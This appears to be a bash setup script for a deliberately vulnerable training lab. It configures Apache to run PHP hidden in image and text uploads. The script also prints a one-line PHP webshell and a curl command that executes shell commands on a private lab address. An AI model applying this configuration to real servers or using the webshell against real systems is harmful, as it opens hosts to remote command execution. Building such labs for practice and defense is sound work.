#!/bin/bash
# =============================================================================
# ACME IT Corp - Webshell Upload Vulnerability
# =============================================================================
# Configures Apache to execute PHP inside files with image/text extensions
# in the /uploads directory. This simulates an unrestricted file upload
# vulnerability — an attacker can upload a .png containing PHP and execute
# commands via ?cmd=.
#
# Run independently:  sudo ./vulnerabilities/webshell_upload.sh
# Called by:          setup.sh
#
# Requires: services/apache.sh must have run first
#
# ⚠️  CONFLICT: defenses/snort.sh (sid:1000011) fires on ?cmd= in HTTP traffic.
#     Run exploitation exercises before starting Snort if you want clean output.
#
# Exploit example (after uploading shell.png):
#   curl "http://192.168.56.21/uploads/shell.png?cmd=id"
# =============================================================================

set -euo pipefail

echo "[webshell] Configuring PHP execution in uploads directory..."

# -----------------------------------------------------------------------------
# .htaccess — tells Apache to treat image/text extensions as PHP
# This works because the uploads.conf below sets AllowOverride All
# -----------------------------------------------------------------------------
cat > /var/www/html/uploads/.htaccess << 'EOF'
AddType application/x-httpd-php .png .jpg .jpeg .txt .pdf
php_flag engine on
EOF

# -----------------------------------------------------------------------------
# Apache conf — enables .htaccess overrides for the uploads directory
# and disables directory listing
# -----------------------------------------------------------------------------
cat > /etc/apache2/conf-available/uploads.conf << 'EOF'
<Directory /var/www/html/uploads>
    AllowOverride All
    Options -Indexes
</Directory>
EOF

a2enconf uploads
systemctl restart apache2

echo "[webshell] PHP execution enabled in /var/www/html/uploads."
echo "[webshell] Upload a file containing PHP and access it via:"
echo "[webshell]   http://192.168.56.21/uploads/<filename>?cmd=<command>"
echo "[webshell] Example shell payload:"
echo '[webshell]   echo "<?php system(\$_GET['"'"'cmd'"'"']); ?>" > shell.png'